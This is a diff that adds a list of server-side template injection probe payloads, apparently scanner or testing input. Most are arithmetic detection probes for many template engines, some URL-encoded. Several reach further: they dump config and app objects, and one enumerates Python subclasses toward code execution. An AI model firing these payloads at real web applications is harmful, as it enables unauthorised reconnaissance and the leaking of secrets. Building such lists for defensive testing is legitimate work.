@@ -1,0 +1,49 @@
+# SSTI probe payloads - one per line, # lines are comments.
+# Polyglot math probe (7*7)
+${7*7}
+# Jinja2 / Twig expression
+{{7*7}}
+# Jinja2 with spaces
+{{ 7*7 }}
+# String concat (Twig/PHP)
+{{7*'7'}}
+# Dollar brace (Java/Thymeleaf style)
+${{7*7}}
+# JSP/EL style
+#{7*7}
+# Ruby ERB style
+<%= 7*7 %>
+# Smarty style
+{7*7}
+# Tornado/Mako style
+${7*7}
+# Jinja2 config object probe
+{{config}}
+# Jinja2 self probe
+{{self}}
+# Twig dump probe
+{{dump(app)}}
+# Django template probe
+{% debug %}
+# Jinja2 attribute access probe
+{{''.__class__}}
+# Jinja2 mro probe
+{{''.__class__.__mro__}}
+# Jinja2 subclasses probe
+{{''.__class__.__mro__[1].__subclasses__()}}
+# Blade / misc double brace with comment
+{{7*7}}<!-- -->
+# Nested polyglot
+${{${7*7}}}
+# Arithmetic with string
+${7+'7'}
+# Percent formatting probe
+%7B%7B7*7%7D%7D
+# URL-encoded Jinja2
+%7B%7B%207*7%20%7D%7D
+# Freemarker probe
+${"freemarker".toString()}
+# Velocity probe
+#set($x=7*7)$x
+# Pebble probe
+{{ '7'*7 }}
